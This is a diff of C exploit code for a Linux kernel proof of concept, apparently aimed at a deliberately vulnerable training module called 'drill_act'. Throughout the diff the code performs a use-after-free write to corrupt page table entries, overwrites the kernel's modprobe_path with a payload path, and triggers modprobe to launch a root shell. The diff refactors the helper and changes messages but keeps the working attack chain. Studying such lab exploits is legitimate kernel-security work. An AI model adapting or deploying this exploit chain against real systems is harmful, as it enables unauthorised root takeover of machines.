@@ -171,18 +171,6 @@ static long get_modprobe_path(char *buf, size_t buflen)
 	return 0;
 }
 
-long UAF_write(long phys_addr, long uaf_n, long act_fd)
-{
-	int ret;
-	char data_for_drill[16];
-	long flags = PT_FLAGS;
-
-	snprintf(data_for_drill, sizeof(data_for_drill),
-			 "0x%08lx" " %d", phys_addr + flags, 0);
-
-	return act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, data_for_drill);
-}
-
 /* The exploit can work without it, but will be less reliable */
 static void flush_tlb(void *addr, size_t len)
 {
@@ -287,7 +275,7 @@ int modprobe_trigger_sock(void)
 	sa.salg_family = AF_ALG;
 	strcpy((char *)sa.salg_type, "dummy");  /* dummy string */
 
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* root shell will start here */
+	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* This should not return */
 
 	return 0;
 }
@@ -322,7 +310,6 @@ int main(void)
 	}
 	printf("[+] drill_act is opened\n");
 
-	printf("[!] pin the process to a single CPU\n");
 	if (do_cpu_pinning() == EXIT_FAILURE)
 		goto end;
 
@@ -402,13 +389,15 @@ int main(void)
 	printf("[+] done, vulnerable page table has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	printf("[+] attempting to overwrite page table entries. This may kill your kernel.\n");
+	long pte_payload = MODPROBE_PATH_ADDR_PART + PT_FLAGS;
+	char str_to_drill[16];
 
-	long phys_addr = MODPROBE_PATH_ADDR_PART;
-	/* doing rewrite to change page table entries */
-	ret = UAF_write(phys_addr, uaf_n, act_fd);
+	snprintf(str_to_drill, sizeof(str_to_drill), "0x%08lx %d", pte_payload, 0);
+	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, str_to_drill);
 	if (ret == EXIT_FAILURE)
 		goto end;
+	printf("[+] DRILL_ACT_SAVE_VAL\n");
+
 	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
 	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
@@ -422,7 +411,7 @@ int main(void)
 
 			if (modprobe_addr != NULL) {
 				printf("[+] success, userspace modprobe address %p\n", modprobe_addr);
-				printf("[!] create an exploit fd and write its path as new modprobe path via the overwritten target object\n");
+				printf("[!] dump an exploit fd and write its path as new modprobe path via the overwritten target object\n");
 
 				char *privesc = prepare_payload();
 				if (privesc  == NULL)
@@ -430,19 +419,21 @@ int main(void)
 				strcpy(modprobe_addr, privesc);
 
 				printf("[+] done, triggering a corrupted modprobe to launch a root shell\n");
-				modprobe_trigger_sock();
+				ret = modprobe_trigger_sock();
+				if (ret == EXIT_FAILURE)
+					goto end;
+				break;
 			}
 		}
 	}
 
-end:
-	printf("[!] finishing this PoC exploit\n");
+	printf("[-] exploit failed\n");
 
+end:
 	if (act_fd >= 0) {
 		ret = close(act_fd);
 		if (ret != 0)
 			perror("[-] close act_fd");
-		printf("  closed the drill_act act_fd\n");
 	}
 
 	return ret;
